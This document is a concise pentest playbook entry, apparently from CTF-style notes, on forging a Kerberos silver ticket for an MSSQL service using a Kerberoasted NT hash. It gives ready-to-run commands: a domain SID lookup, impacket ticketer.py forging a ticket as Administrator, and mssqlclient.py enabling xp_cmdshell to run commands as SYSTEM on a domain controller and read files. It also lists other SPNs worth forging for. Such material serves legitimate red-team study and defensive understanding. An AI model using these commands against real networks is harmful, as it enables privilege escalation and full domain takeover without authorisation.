# Silver Ticket — MSSQL `sa` Impersonation via Kerberoast NT Hash

## When this applies

- AD environment where NTLM is disabled or you have a Kerberoasted service-account NT hash.
- You want to forge a TGS for the MSSQL SPN impersonating Administrator (the canonical "I have a service hash, what now?" privesc on Kerberos-only AD).

## Technique

Forge a TGS for a specific service SPN using the service account's NT hash and the domain SID. The KDC is bypassed entirely — the service decrypts and accepts the forged ticket because it's encrypted with its own key.

## Steps

```bash
# Step 1 — discover the domain SID via LDAP-with-GSSAPI (NTLM-disabled doesn't block
# LDAP queries when you bind with a TGT):
KRB5CCNAME=user.ccache ldapsearch -Y GSSAPI -H ldap://dc1.domain.local \
  -b 'DC=domain,DC=local' -s base '(objectClass=domain)' objectSid
# If the binary SID isn't auto-decoded, convert it:
# python3 -c "import base64; sid=base64.b64decode('<base64_sid>'); ..." (or use lookupsid.py)
# Fallback: `lookupsid.py -k -no-pass DC1.domain.local` (Kerberos via ccache)
# Or: bloodyAD -d domain -u user -p pass --host DC get object 'DC=domain,DC=local' --resolve-sid

# Step 2 — forge a TGS for the MSSQL SPN, impersonating Administrator:
ticketer.py -nthash <NTHASH_OF_SQL_SVC_ACCOUNT> -domain-sid 'S-1-5-21-...' \
  -domain DOMAIN.LOCAL -spn 'MSSQLSvc/dc1.domain.local:1433' Administrator
# Output: Administrator.ccache — a TGS the MSSQL service will accept, with Administrator's
# group memberships baked in (sysadmin via the default sa-equivalent mapping).

# Step 3 — log in via Kerberos and pop SYSTEM:
KRB5CCNAME=Administrator.ccache mssqlclient.py -k -no-pass dc1.domain.local
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami                         # nt authority\system (DC$ context)
SQL> xp_cmdshell type C:\Users\Administrator\Desktop\root.txt
```

## Verifying success

- `mssqlclient.py -k -no-pass` connects without password and reports `nt authority\system` from `xp_cmdshell whoami`.

## Common pitfalls

- MSSQLSvc is the canonical silver-ticket target on AD because the service typically runs as a privileged domain account (or as `DC$` on a DC) — `sa` → SYSTEM via `xp_cmdshell` is one query away.
- Other useful SPNs to forge for: `cifs/<host>` (SMB share access as Administrator), `host/<host>` (PSExec/scheduled tasks), `http/<host>` (IIS), `ldap/<host>` (LDAP write).
- Silver tickets are forged from **Kerberoasted service hashes**, NOT AS-REP-roasted user hashes — wrong key for the SPN.
- Use FQDN, never IP for any Kerberos-authenticated request — the SPN ticket is bound to the hostname.

## Tools

- impacket `ticketer.py`, `mssqlclient.py`, `lookupsid.py`
- bloodyAD (for SID lookup)
- ldapsearch (with GSSAPI)
